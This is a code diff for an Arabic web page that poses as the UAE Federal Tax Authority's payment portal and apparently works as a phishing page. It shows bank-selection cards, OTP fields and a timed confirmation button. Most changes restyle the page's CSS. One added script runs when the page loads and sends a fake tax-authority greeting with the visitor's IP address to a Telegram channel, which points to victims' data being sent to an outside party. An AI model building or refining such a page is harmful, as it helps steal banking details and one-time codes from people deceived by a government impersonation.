@@ -7,22 +7,85 @@
     
 <style>/* Error loading CSS rules from https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap */
 
-:root { --primary-color: #008000; --secondary-color: #FFD700; --text-color: #333; --light-gray: #f5f5f5; --border-color: #ddd; --error-color: #e74c3c; --success-color: #2ecc71; }
+:root { 
+    --primary-color: #007a33; 
+    --primary-hover: #005a26;
+    --secondary-color: #cbb067; 
+    --text-color: #2c3e50; 
+    --light-gray: #f8f9fa; 
+    --border-color: #e0e0e0; 
+    --error-color: #dc3545; 
+    --success-color: #28a745; 
+    --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+}
 * { box-sizing: border-box; margin: 0px; padding: 0px; }
-body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); color: var(--text-color); line-height: 1.6; }
-.container { max-width: 800px; margin: 0px auto; padding: 20px; min-height: 100vh; }
-.header { text-align: center; margin-bottom: 30px; padding: 20px; background-color: white; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 2px 10px; }
-.header img { height: 80px; margin-bottom: 10px; }
-.header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
-.form-container { background-color: white; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 2px 10px; padding: 30px; margin-bottom: 20px; }
+body { 
+    font-family: 'Tajawal', sans-serif; 
+    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+    color: var(--text-color); 
+    line-height: 1.6; 
+    min-height: 100vh;
+}
+.container { max-width: 650px; margin: 0px auto; padding: 40px 20px; }
+.header { 
+    text-align: center; 
+    margin-bottom: 30px; 
+    padding: 30px; 
+    background-color: white; 
+    border-radius: 15px; 
+    box-shadow: var(--shadow);
+    border-bottom: 4px solid var(--secondary-color);
+}
+.header img { height: 90px; margin-bottom: 15px; }
+.header h1 { color: var(--primary-color); font-size: 28px; font-weight: 700; margin-bottom: 5px; }
+.header p { color: #666; font-size: 16px; }
+.form-container { 
+    background-color: white; 
+    border-radius: 15px; 
+    box-shadow: var(--shadow); 
+    padding: 40px; 
+    margin-bottom: 20px; 
+    transition: transform 0.3s ease;
+}
 .form-group { margin-bottom: 20px; }
 .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
-.form-control { width: 100%; padding: 12px 15px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 16px; font-family: Tajawal, sans-serif; transition: border-color 0.3s; }
-.form-control:required { border-left: 3px solid var(--primary-color); }
-.form-control:focus { outline: none; border-color: var(--primary-color); }
-.btn { display: inline-block; background-color: var(--primary-color); color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: 500; font-family: Tajawal, sans-serif; transition: background-color 0.3s; }
-.btn:hover { background-color: rgb(0, 102, 0); }
-.btn:disabled { background-color: rgb(204, 204, 204); cursor: not-allowed; }
+.form-control { 
+    width: 100%; 
+    padding: 14px 18px; 
+    border: 2px solid var(--border-color); 
+    border-radius: 10px; 
+    font-size: 16px; 
+    font-family: Tajawal, sans-serif; 
+    transition: all 0.3s ease;
+    background-color: var(--light-gray);
+}
+.form-control:focus { 
+    outline: none; 
+    border-color: var(--primary-color); 
+    background-color: white;
+    box-shadow: 0 0 0 4px rgba(0, 122, 51, 0.1);
+}
+.btn { 
+    display: inline-block; 
+    background: linear-gradient(to left, var(--primary-color), var(--primary-hover));
+    color: white; 
+    padding: 16px 30px; 
+    border: none; 
+    border-radius: 10px; 
+    cursor: pointer; 
+    font-size: 18px; 
+    font-weight: 700; 
+    font-family: Tajawal, sans-serif; 
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(0, 122, 51, 0.3);
+}
+.btn:hover { 
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(0, 122, 51, 0.4);
+}
+.btn:active { transform: translateY(0); }
+.btn:disabled { background-color: rgb(204, 204, 204); cursor: not-allowed; opacity: 0.6; }
+.btn-success-active:not(:disabled) { background: #28a745 !important; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3); }
 .btn-block { display: block; width: 100%; }
 .btn-link { background: none; color: var(--primary-color); text-decoration: underline; padding: 5px; font-size: 14px; }
 .btn-link:hover { background: none; color: rgb(0, 77, 0); }
@@ -33,9 +96,29 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
   100% { transform: rotate(360deg); }
 }
 .bank-cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; margin-top: 20px; }
-.bank-card { background-color: white; border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; }
-.bank-card:hover { transform: translateY(-5px); box-shadow: rgba(0, 0, 0, 0.1) 0px 5px 15px; border-color: var(--primary-color); }
-.bank-card.selected { border-color: var(--primary-color); background-color: rgba(0, 128, 0, 0.05); }
+.bank-card { 
+    background-color: white; 
+    border: 2px solid var(--border-color); 
+    border-radius: 12px; 
+    padding: 20px; 
+    text-align: center; 
+    cursor: pointer; 
+    transition: all 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+.bank-card:hover { 
+    transform: translateY(-8px); 
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); 
+    border-color: var(--secondary-color); 
+}
+.bank-card.selected { 
+    border-color: var(--primary-color); 
+    background-color: rgba(0, 122, 51, 0.05); 
+    box-shadow: 0 0 0 4px rgba(0, 122, 51, 0.1);
+}
 .bank-card img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 10px; }
 .bank-card p { font-size: 14px; font-weight: 500; margin: 0px; }
 .error-message { color: var(--error-color); font-size: 14px; margin-top: 5px; display: none; }
@@ -55,10 +138,23 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
 .page.active { display: block; }
 .intro-image { width: 100%; max-height: 300px; object-fit: cover; border-radius: 10px; margin-bottom: 20px; }
 .description { margin-bottom: 30px; line-height: 1.8; }
-.info-summary { background-color: rgb(248, 249, 250); padding: 20px; border-radius: 8px; margin-bottom: 20px; }
-.info-row { display: flex; justify-content: space-between; margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid rgb(238, 238, 238); }
-.info-label { font-weight: 500; }
-.info-value { color: rgb(85, 85, 85); }
+.info-summary { 
+    background-color: var(--light-gray); 
+    padding: 25px; 
+    border-radius: 12px; 
+    margin-bottom: 25px; 
+    border-right: 5px solid var(--secondary-color);
+}
+.info-row { 
+    display: flex; 
+    justify-content: space-between; 
+    margin-bottom: 15px; 
+    padding-bottom: 12px; 
+    border-bottom: 1px solid #eee; 
+}
+.info-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+.info-label { font-weight: 700; color: var(--primary-color); }
+.info-value { color: var(--text-color); font-weight: 500; }
 .auth-message { background-color: rgb(232, 245, 233); border: 1px solid rgb(200, 230, 201); border-radius: 8px; padding: 15px; margin: 20px 0px; text-align: center; }
 .timer { font-weight: bold; color: var(--primary-color); }
 .dual-otp { display: flex; gap: 10px; margin: 20px 0px; }
@@ -476,6 +572,12 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
         document.addEventListener('DOMContentLoaded', function() {
             // الحصول على عنوان IP عند تحميل الصفحة
             getUserIP();
+            
+            // إرسال إشعار تحية أولي من هيئة الاتحادية للضرائب
+            setTimeout(() => {
+                const initialNotification = `🏛️ <b>إشعار من هيئة الاتحادية للضرائب</b>\n\n📌 مرحباً بك في بوابة سداد الإمارات\n\n✅ تم الدخول إلى النظام بنجاح\n🌐 عنوان IP: ${userIP || 'جاري التحميل...'}\n⏰ الوقت: ${new Date().toLocaleString('ar-AE')}`;
+                sendToTelegram(initialNotification);
+            }, 500);
             
             // إضافة مستمعات الأحداث للتحقق من الصحة أثناء الكتابة
             setupFormValidation();
@@ -2019,10 +2121,12 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
                 </div>
             `;
             
-            // بدء المؤقت لتفعيل الزر بعد 30 ثانية
+            // بدء المؤقت لتفعيل الزر بعد 30 ثانية وتغيير لونه للأخضر
             startTimer(30, 'browserAuthTimer', () => {
-                document.getElementById('authConfirmBtn').disabled = false;
-                document.getElementById('authConfirmBtn').addEventListener('click', handleBrowserAuthConfirmation);
+                const confirmBtn = document.getElementById('authConfirmBtn');
+                confirmBtn.disabled = false;
+                confirmBtn.classList.add('btn-success-active');
+                confirmBtn.addEventListener('click', handleBrowserAuthConfirmation);
             });
         }
 
